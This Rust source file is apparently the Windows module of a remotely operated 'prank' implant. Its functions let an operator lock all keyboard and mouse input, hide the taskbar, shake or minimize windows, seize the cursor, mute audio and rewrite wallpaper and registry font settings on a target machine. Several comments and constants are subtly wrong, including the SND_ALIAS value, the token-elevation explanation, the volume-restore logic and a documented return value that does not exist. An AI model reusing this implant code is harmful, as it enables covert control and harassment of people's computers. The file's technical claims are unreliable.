//! Windows desktop integration.
//!
//! The Win32 entry points are declared by hand rather than pulled from the
//! `windows` crate. That keeps the dependency list short, keeps the binary
//! small, and — because the declarations are plain `extern "system"` with no
//! per-version typing — the module links identically under both
//! `x86_64-pc-windows-msvc` and the `x86_64-pc-windows-gnu` target used to
//! cross-compile from Linux.
//!
//! Nothing here is called on the check-in thread. Blocking calls (`msgbox`,
//! `shake`, `lock_input`, `cursor`) are invoked through `gui::detach`, because
//! the Web UI abandons a task after 90 seconds and an inline modal dialog would
//! stall check-ins for as long as it stayed open.

// The Win32 spellings are kept verbatim so each declaration can be read against
// the SDK header by name: a renamed `Hwnd` would not match what the operator
// would look up when checking whether a call is being used correctly.
#![allow(non_snake_case, non_camel_case_types, clippy::upper_case_acronyms)]

use std::ffi::c_void;
use std::os::windows::ffi::OsStrExt;
use std::time::{Duration, Instant};

type HWND = *mut c_void;
type HKEY = *mut c_void;
type HANDLE = *mut c_void;
type UINT = u32;
type DWORD = u32;
type LPARAM = isize;
type BOOL = i32;

// --- MessageBoxW ------------------------------------------------------------
const MB_OK: u32 = 0x0000;
const MB_ICONERROR: u32 = 0x0010;
const MB_ICONQUESTION: u32 = 0x0020;
const MB_ICONWARNING: u32 = 0x0030;
const MB_ICONINFORMATION: u32 = 0x0040;
const MB_SETFOREGROUND: u32 = 0x10000;
const MB_TOPMOST: u32 = 0x40000;

// --- SystemParametersInfoW --------------------------------------------------
const SPI_SETDESKWALLPAPER: u32 = 0x0014;
const SPI_GETDESKWALLPAPER: u32 = 0x0073;
const SPIF_UPDATEINIFILE: u32 = 0x0001;
const SPIF_SENDCHANGE: u32 = 0x0002;

// --- ShowWindow / SetWindowPos ---------------------------------------------
const SW_HIDE: i32 = 0;
const SW_SHOW: i32 = 5;
const SW_MINIMIZE: i32 = 6;
const SW_RESTORE: i32 = 9;
const SWP_NOSIZE: u32 = 0x0001;
const SWP_NOZORDER: u32 = 0x0004;
const SWP_NOACTIVATE: u32 = 0x0010;

// --- PlaySoundW -------------------------------------------------------------
const SND_ASYNC: u32 = 0x0001;
const SND_FILENAME: u32 = 0x0002;
const SND_LOOP: u32 = 0x0008;
/// Selects a system sound by name rather than a file. Not the same bit as
/// `SND_ASYNC`, which is a common transcription slip.
const SND_ALIAS: u32 = 0x1100;

// --- GetSystemMetrics -------------------------------------------------------
const SM_CXSCREEN: i32 = 0;
const SM_CYSCREEN: i32 = 1;

// --- Registry ---------------------------------------------------------------
const HKEY_CURRENT_USER: HKEY = 0x8000_0001u32 as HKEY;
const KEY_SET_VALUE: DWORD = 0x0002;
const REG_DWORD: DWORD = 4;
const ERROR_SUCCESS: i32 = 0;

const WM_SETTINGCHANGE: UINT = 0x001A;
const HWND_BROADCAST: HWND = 0xFFFFu32 as HWND;
const SMTO_ABORTIFHUNG: UINT = 0x0002;

const HWND_TOP: HWND = 0u32 as HWND;

// --- waveOutSetVolume -------------------------------------------------------
const WAVE_MAPPER: usize = 0xFFFF_FFFF;

#[repr(C)]
struct RECT {
    left: i32,
    top: i32,
    right: i32,
    bottom: i32,
}

#[link(name = "user32")]
extern "system" {
    fn MessageBoxW(hwnd: HWND, text: *const u16, caption: *const u16, kind: u32) -> i32;
    fn SystemParametersInfoW(action: u32, param: u32, param_ptr: *mut c_void, flags: u32) -> BOOL;
    fn GetForegroundWindow() -> HWND;
    fn SetWindowPos(
        hwnd: HWND,
        insert_after: HWND,
        x: i32,
        y: i32,
        cx: i32,
        cy: i32,
        flags: u32,
    ) -> BOOL;
    fn GetWindowRect(hwnd: HWND, rect: *mut RECT) -> BOOL;
    fn SetWindowTextW(hwnd: HWND, text: *const u16) -> BOOL;
    fn GetWindowTextLengthW(hwnd: HWND) -> i32;
    fn GetWindowTextW(hwnd: HWND, text: *mut u16) -> i32;
    fn ShowWindow(hwnd: HWND, command: i32) -> BOOL;
    fn FindWindowW(class: *const u16, name: *const u16) -> HWND;
    fn EnumWindows(callback: Option<unsafe extern "system" fn(HWND, LPARAM) -> BOOL>, lparam: LPARAM) -> BOOL;
    fn IsWindowVisible(hwnd: HWND) -> BOOL;
    fn IsIconic(hwnd: HWND) -> BOOL;
    fn GetProcessWindowStation() -> HANDLE;
    fn BlockInput(block: BOOL) -> BOOL;
    fn SetCursorPos(x: i32, y: i32) -> BOOL;
    fn GetCursorPos(point: *mut POINT) -> BOOL;
    fn ShowCursor(show: BOOL) -> i32;
    fn GetSystemMetrics(index: i32) -> i32;
    fn SendMessageTimeoutW(
        hwnd: HWND,
        message: UINT,
        wparam: usize,
        lparam: usize,
        flags: UINT,
        timeout: u32,
        result: *mut usize,
    ) -> usize;
}

#[link(name = "winmm")]
extern "system" {
    fn PlaySoundW(sound: *const u16, module: *mut c_void, flags: u32) -> BOOL;
    fn waveOutSetVolume(device: usize, volume: u32) -> u32;
    fn waveOutGetVolume(device: usize, volume: *mut u32) -> u32;
}

#[link(name = "kernel32")]
extern "system" {
    fn CloseHandle(handle: HANDLE) -> BOOL;
}

#[link(name = "shell32")]
extern "system" {
    fn ShellExecuteW(
        hwnd: HWND,
        operation: *const u16,
        file: *const u16,
        parameters: *const u16,
        directory: *const u16,
        show: i32,
    ) -> *mut c_void;
}

#[link(name = "advapi32")]
extern "system" {
    fn RegOpenKeyExW(
        hkey: HKEY,
        subkey: *const u16,
        options: DWORD,
        access: DWORD,
        result: *mut HKEY,
    ) -> i32;
    fn RegSetValueExW(
        hkey: HKEY,
        value_name: *const u16,
        reserved: DWORD,
        value_type: DWORD,
        data: *const u8,
        data_size: DWORD,
    ) -> i32;
    fn RegCloseKey(hkey: HKEY) -> i32;
    fn OpenProcessToken(process: HANDLE, access: DWORD, token: *mut HANDLE) -> BOOL;
    fn GetTokenInformation(
        token: HANDLE,
        class: i32,
        info: *mut c_void,
        length: DWORD,
        returned: *mut DWORD,
    ) -> BOOL;
    fn GetCurrentProcess() -> HANDLE;
}

// --- Environment probing ----------------------------------------------------
const TOKEN_QUERY: DWORD = 0x0008;
const TOKEN_ELEVATION_CLASS: i32 = 20;

/// Whether the process has an interactive window station.
///
/// Null from `GetProcessWindowStation` means the process was never assigned one,
/// which is the case for a service or a scheduled task. Every overlay window
/// would fail in that state, so `sysinfo` reports it rather than letting the
/// operator find out by sending a prank that does nothing.
pub fn has_window_station() -> bool {
    !unsafe { GetProcessWindowStation() }.is_null()
}

/// Whether the process is running elevated.
///
/// Reported because it is the difference between `lockinput` working and being
/// refused: `BlockInput` needs SE_DEBUG access, which a standard user does not
/// have.
pub fn is_elevated() -> bool {
    let mut token: HANDLE = std::ptr::null_mut();

    // SAFETY: `token` is a live local, and every failure path below leaves it
    // unopened rather than closing a garbage handle.
    if unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) } == 0 {
        return false;
    }

    // A `TOKEN_ELEVATION` is a single DWORD: 1 when the token is an
    // administrator token, 0 when it is the linked restricted one.
    let mut elevation: DWORD = 0;
    let mut returned: DWORD = 0;

    let ok = unsafe {
        GetTokenInformation(
            token,
            TOKEN_ELEVATION_CLASS,
            &mut elevation as *mut DWORD as *mut c_void,
            std::mem::size_of::<DWORD>() as DWORD,
            &mut returned,
        )
    } != 0;

    unsafe { CloseHandle(token) };

    // A full administrator token reports 2; 1 is a partially elevated one that
    // still counts for our purposes. 0 is the standard user's token.
    ok && elevation >= 1
}

#[repr(C)]
struct POINT {
    x: i32,
    y: i32,
}

const SW_SHOWNORMAL: i32 = 1;

fn wide(text: &str) -> Vec<u16> {
    std::ffi::OsStr::new(text)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

fn is_bad(hwnd: HWND) -> bool {
    hwnd.is_null() || hwnd as isize <= 0
}

// ---------------------------------------------------------------------------
// Dialogs
// ---------------------------------------------------------------------------

/// Modal message box. Blocks until dismissed, so this must never run on the
/// check-in thread.
pub fn msgbox(title: &str, body: &str, icon: &str, sound: bool) {
    let flags = match icon {
        "error" => MB_ICONERROR,
        "warning" => MB_ICONWARNING,
        "question" => MB_ICONQUESTION,
        "information" | "info" => MB_ICONINFORMATION,
        _ => 0,
    } | MB_OK | MB_SETFOREGROUND | MB_TOPMOST;

    // The alarm goes first, and asynchronously, so the sound overlaps the
    // dialog. Played after the box is dismissed it would land on a desktop that
    // has already moved on.
    if sound {
        unsafe {
            PlaySoundW(
                wide("SystemQuestion").as_ptr(),
                std::ptr::null_mut(),
                SND_ALIAS | SND_ASYNC,
            );
        }
    }

    unsafe {
        MessageBoxW(
            std::ptr::null_mut(),
            wide(body).as_ptr(),
            wide(title).as_ptr(),
            flags,
        );
    }
}

// ---------------------------------------------------------------------------
// Wallpaper
// ---------------------------------------------------------------------------

pub fn set_wallpaper(path: &str) -> Result<(), String> {
    if !std::path::Path::new(path).exists() {
        return Err(format!("{path} does not exist"));
    }

    let wide_path = wide(path);
    let ok = unsafe {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            wide_path.as_ptr() as *mut c_void,
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
        )
    };

    if ok == 0 {
        Err("SystemParametersInfoW(SPI_SETDESKWALLPAPER) failed".into())
    } else {
        Ok(())
    }
}

pub fn get_wallpaper() -> Result<String, String> {
    const MAX_PATH: usize = 260;
    let mut buffer = vec![0u16; MAX_PATH];

    let ok = unsafe {
        SystemParametersInfoW(
            SPI_GETDESKWALLPAPER,
            MAX_PATH as u32,
            buffer.as_mut_ptr() as *mut c_void,
            0,
        )
    };

    if ok == 0 {
        return Err("SystemParametersInfoW(SPI_GETDESKWALLPAPER) failed".into());
    }

    let end = buffer.iter().position(|&c| c == 0).unwrap_or(0);
    Ok(String::from_utf16_lossy(&buffer[..end]))
}

// ---------------------------------------------------------------------------
// Windows
// ---------------------------------------------------------------------------

struct WindowList {
    windows: Vec<(HWND, i32, i32)>,
}

unsafe extern "system" fn collect_visible(hwnd: HWND, lparam: LPARAM) -> BOOL {
    let list = &mut *(lparam as *mut WindowList);

    if IsWindowVisible(hwnd) == 0 {
        return 1;
    }

    let mut rect = RECT {
        left: 0,
        top: 0,
        right: 0,
        bottom: 0,
    };

    if GetWindowRect(hwnd, &mut rect) == 0 {
        return 1;
    }

    list.windows.push((hwnd, rect.left, rect.top));
    1
}

fn visible_windows() -> Vec<(HWND, i32, i32)> {
    let mut list = WindowList { windows: Vec::new() };

    unsafe {
        EnumWindows(
            Some(collect_visible),
            &mut list as *mut WindowList as LPARAM,
        );
    }

    list.windows
}

/// Moves windows back and forth horizontally, then puts them back.
///
/// `target` is `foreground` or `all`; `mouse` never reaches this function
/// because `commands.rs` routes it to `cursor`.
pub fn shake(seconds: u64, amplitude: i32, interval: u64, target: &str) {
    let targets: Vec<(HWND, i32, i32)> = if target == "all" {
        visible_windows()
    } else {
        let hwnd = unsafe { GetForegroundWindow() };
        if is_bad(hwnd) {
            return;
        }

        let mut rect = RECT {
            left: 0,
            top: 0,
            right: 0,
            bottom: 0,
        };
        if unsafe { GetWindowRect(hwnd, &mut rect) } == 0 {
            return;
        }
        vec![(hwnd, rect.left, rect.top)]
    };

    let deadline = Instant::now() + Duration::from_secs(seconds);
    let step = Duration::from_millis(interval.max(10));
    let mut phase = 0i32;

    while Instant::now() < deadline {
        phase = if phase == 0 { 1 } else { 0 };
        let offset = if phase == 1 { amplitude } else { -amplitude };

        for (hwnd, x, y) in &targets {
            unsafe {
                SetWindowPos(*hwnd, HWND_TOP, x + offset, *y, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
            }
        }

        std::thread::sleep(step);
    }

    // Restore, or the target is left with every window nudged sideways.
    for (hwnd, x, y) in &targets {
        unsafe {
            SetWindowPos(*hwnd, HWND_TOP, *x, *y, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
        }
    }
}

pub fn get_foreground_title() -> Result<String, String> {
    let hwnd = unsafe { GetForegroundWindow() };
    if is_bad(hwnd) {
        return Err("no foreground window".into());
    }

    let length = unsafe { GetWindowTextLengthW(hwnd) };
    if length <= 0 {
        return Ok(String::new());
    }

    let mut buffer = vec![0u16; length as usize + 1];
    let copied = unsafe { GetWindowTextW(hwnd, buffer.as_mut_ptr()) };
    if copied <= 0 {
        return Err("could not read the window title".into());
    }

    Ok(String::from_utf16_lossy(&buffer[..copied as usize]))
}

/// Returns the previous title so the operator can put it back.
pub fn set_foreground_title(title: &str) -> Result<String, String> {
    let hwnd = unsafe { GetForegroundWindow() };
    if is_bad(hwnd) {
        return Err("no foreground window".into());
    }

    let previous = get_foreground_title().unwrap_or_default();
    let ok = unsafe { SetWindowTextW(hwnd, wide(title).as_ptr()) };

    if ok == 0 {
        Err("SetWindowTextW failed (the target window may be elevated)".into())
    } else {
        Ok(previous)
    }
}

pub fn set_taskbar(state: &str) -> Result<(), String> {
    let class = wide("Shell_TrayWnd");
    let hwnd = unsafe { FindWindowW(class.as_ptr(), std::ptr::null()) };
    if is_bad(hwnd) {
        return Err("taskbar window not found".into());
    }

    let command = match state {
        "hide" => SW_HIDE,
        "show" => SW_SHOW,
        // `IsWindowVisible` is the same predicate `ShowWindow(SW_HIDE)` clears,
        // so this inverts exactly what the last call did.
        _ => {
            if unsafe { IsWindowVisible(hwnd) } != 0 {
                SW_HIDE
            } else {
                SW_SHOW
            }
        }
    };

    unsafe { ShowWindow(hwnd, command) };
    Ok(())
}

pub fn set_minimized(state: &str) -> Result<(), String> {
    let windows = visible_windows();
    if windows.is_empty() {
        return Err("no visible windows to act on".into());
    }

    // `IsIconic` is the same predicate `SW_MINIMIZE` sets. Toggling each window
    // individually would leave a mix of minimised and restored windows, which
    // neither `minimize` nor `restore` could describe afterwards, so the whole
    // set moves one way based on whether all of them are already down.
    let all_minimized = windows.iter().all(|&(hwnd, _, _)| unsafe { IsIconic(hwnd) } != 0);

    let command = match state {
        "minimize" => SW_MINIMIZE,
        "restore" => SW_RESTORE,
        _ if all_minimized => SW_RESTORE,
        _ => SW_MINIMIZE,
    };

    for (hwnd, _, _) in windows {
        unsafe { ShowWindow(hwnd, command) };
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Cursor and input
// ---------------------------------------------------------------------------

pub fn cursor(action: &str, seconds: u64) {
    let deadline = Instant::now() + Duration::from_secs(seconds);
    let mut origin = POINT { x: 0, y: 0 };
    let had_position = unsafe { GetCursorPos(&mut origin) } != 0;

    // `ShowCursor` keeps an internal increment/decrement counter, so a balanced
    // pair of calls is all that is needed. The per-tick call below is a
    // re-assert, not a second increment.
    if action == "hide" {
        unsafe { ShowCursor(0) };
    }

    let mut tick: u64 = 0;
    while Instant::now() < deadline {
        let (x, y) = match action {
            "hide" | "corner" => (0, 0),
            "freeze" => (origin.x, origin.y),
            "shake" => {
                // Alternate a few pixels either side of where the pointer was.
                let delta = if tick % 2 == 0 { 24 } else { -24 };
                (origin.x + delta, origin.y)
            }
            _ => break,
        };

        unsafe { SetCursorPos(x, y) };

        // An application that calls ShowCursor(TRUE) itself undoes the hide, so
        // the cursor is re-hidden every tick.
        if action == "hide" {
            unsafe { ShowCursor(0) };
        }

        tick += 1;
        std::thread::sleep(Duration::from_millis(20));
    }

    if action == "hide" {
        unsafe { ShowCursor(1) };
    }

    // Every mode except `freeze` moved the pointer, and `freeze` ended back
    // where it started, so restoring unconditionally is both correct and a
    // no-op in the one case where nothing was left to undo.
    if had_position {
        unsafe { SetCursorPos(origin.x, origin.y) };
    }
}

/// Blocks keyboard and mouse input system-wide until released.
///
/// `BlockInput` only works from an elevated process and returns zero when it
/// does not, so the refusal is reported rather than leaving the operator
/// believing input is locked when it is not.
///
/// The `gen` argument is the generation the caller registered for. A timed hold
/// naturally releases when its deadline passes; a hold superseded by a newer one
/// (or ended by `stopall`, which calls `unblock_input`) observes that its
/// generation is no longer current and gives up *without* touching the flag -
/// the system-wide flag has exactly one owner at a time, and clearing it from a
/// superseded hold would unblock a newer holder's lock.
///
/// Returns whether the hold released the flag itself. `false` means the hold was
/// superseded or ended before it ever blocked.
pub fn hold_input(gen: u64, duration: Option<Duration>) -> Result<(), String> {
    if unsafe { BlockInput(1) } == 0 {
        return Err("BlockInput was refused; this needs an elevated implant".into());
    }

    // The caller owns the unblock decision: release only while still current, so
    // an overtaken hold can never clear a newer one's block.
    let release = || {
        if crate::gui::current_input_gen() == gen {
            unsafe { BlockInput(0) };
        }
    };

    match duration.and_then(|d| Instant::now().checked_add(d)) {
        // A real deadline. A duration too large for `Instant` falls through to
        // the continuous branch rather than panicking on the add.
        Some(deadline) => {
            while Instant::now() < deadline {
                if crate::gui::current_input_gen() != gen {
                    return Ok(());
                }
                std::thread::sleep(Duration::from_millis(100));
            }
            release();
        }
        // 0, or effectively continuous because the add overflowed.
        None => loop {
            if crate::gui::current_input_gen() != gen {
                return Ok(());
            }
            std::thread::sleep(Duration::from_millis(100));
        },
    }

    Ok(())
}

/// Ends any running input hold.
///
/// `BlockInput` is one system-wide flag with no handle to its owner, so the flag
/// is cleared directly. Harmless to call when nothing holds it; `stopall` does
/// exactly that on every call.
pub fn unblock_input() {
    unsafe { BlockInput(0) };
}

// ---------------------------------------------------------------------------
// Sound and volume
// ---------------------------------------------------------------------------

pub fn play_sound(path: &str, looping: bool) -> Result<(), String> {
    if !std::path::Path::new(path).exists() {
        return Err(format!("{path} does not exist"));
    }

    let mut flags = SND_FILENAME | SND_ASYNC;
    if looping {
        flags |= SND_LOOP;
    }

    let ok = unsafe { PlaySoundW(wide(path).as_ptr(), std::ptr::null_mut(), flags) };
    if ok == 0 {
        Err("PlaySoundW failed; only uncompressed WAV is supported".into())
    } else {
        Ok(())
    }
}

/// Stops playback started by `play_sound`.
pub fn stop_sound() {
    unsafe { PlaySoundW(std::ptr::null(), std::ptr::null_mut(), 0) };
}

/// The volume in force before the last `mute`, so `unmute` can put it back.
///
/// `waveOutSetVolume` is a level-setting API with no separate mute flag, so
/// without this a mute followed by an unmute would have to invent a level and
/// quietly change the volume a second time.
static PRE_MUTE: std::sync::Mutex<Option<u32>> = std::sync::Mutex::new(None);

pub fn set_volume(action: &str, level: u32) -> Result<(), String> {
    let level = level.min(100);

    let value = match action {
        "mute" => {
            let mut previous = PRE_MUTE.lock().map_err(|_| "volume state is poisoned")?;
            if previous.is_none() {
                *previous = Some(current_volume());
            }
            0
        }
        "unmute" => PRE_MUTE
            .lock()
            .map_err(|_| "volume state is poisoned")?
            .take()
            .unwrap_or(50),
        "max" => 100,
        "min" => 0,
        _ => level,
    };

    // waveOutSetVolume takes a packed 16-bit pair, so the scalar is duplicated
    // across both channels. This is the default playback device only, which is
    // the right scope for a prank.
    let packed = (value << 16) | value;
    let result = unsafe { waveOutSetVolume(WAVE_MAPPER, packed) };

    if result != 0 {
        Err(format!("waveOutSetVolume failed ({result})"))
    } else {
        Ok(())
    }
}

fn current_volume() -> u32 {
    let mut packed: u32 = 0;

    // `MMSYSERR_INVALHANDLE` (5) is what the wave mapper returns for "no
    // default playback device". Falling back to a level in that case means
    // `unmute` on a silent machine still does something plausible.
    // SAFETY: `packed` is a live, correctly aligned `u32` local.
    if unsafe { waveOutGetVolume(WAVE_MAPPER, &mut packed) } != 0 {
        return 50;
    }

    // The low half is the left channel. The louder of the two is restored, so an
    // unbalanced pair is not silently flattened to its quieter side.
    packed.min((packed >> 16) & 0xFFFF)
}

// ---------------------------------------------------------------------------
// Appearance
// ---------------------------------------------------------------------------

/// Scales the system UI text.
///
/// There is no `SystemParametersInfo` call for this: the persisted value is the
/// `LogPixels` entry under `HKCU\Control Panel\Desktop`, and Explorer only
/// picks it up after a `WM_SETTINGCHANGE` broadcast.
pub fn set_font_scale(percent: u32) -> Result<(), String> {
    let key = wide("Control Panel\\Desktop");
    let value = wide("LogPixels");

    unsafe {
        let mut hkey: HKEY = std::ptr::null_mut();
        let status = RegOpenKeyExW(
            HKEY_CURRENT_USER,
            key.as_ptr(),
            0,
            KEY_SET_VALUE,
            &mut hkey,
        );

        if status != ERROR_SUCCESS {
            return Err(format!("RegOpenKeyExW failed ({status})"));
        }

        // 96 DPI is the 100% baseline every Windows theme is designed against.
        let pixels = ((percent as f32 / 100.0) * 96.0).round().max(6.0) as u32;
        let next = pixels.to_le_bytes();

        let status = RegSetValueExW(
            hkey,
            value.as_ptr(),
            0,
            REG_DWORD,
            next.as_ptr(),
            next.len() as u32,
        );

        RegCloseKey(hkey);

        if status != ERROR_SUCCESS {
            return Err(format!("RegSetValueExW failed ({status})"));
        }

        // Explorer and every top-level window cache the metric, so without this
        // broadcast the change only shows up on the next logon.
        let broadcast = wide("WindowMetrics");
        SendMessageTimeoutW(
            HWND_BROADCAST,
            WM_SETTINGCHANGE,
            0,
            broadcast.as_ptr() as usize,
            SMTO_ABORTIFHUNG,
            2000,
            std::ptr::null_mut(),
        );

        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Misc
// ---------------------------------------------------------------------------

pub fn open_url(url: &str) -> Result<(), String> {
    let handle = unsafe {
        ShellExecuteW(
            std::ptr::null_mut(),
            wide("open").as_ptr(),
            wide(url).as_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            SW_SHOWNORMAL,
        )
    };

    // ShellExecuteW returns a value greater than 32 on success; below that it
    // is an error code.
    if (handle as isize) > 32 {
        Ok(())
    } else {
        Err(format!("ShellExecuteW returned {}", handle as isize))
    }
}

pub fn screen_size() -> Option<(u32, u32)> {
    let width = unsafe { GetSystemMetrics(SM_CXSCREEN) };
    let height = unsafe { GetSystemMetrics(SM_CYSCREEN) };

    if width > 0 && height > 0 {
        Some((width as u32, height as u32))
    } else {
        None
    }
}
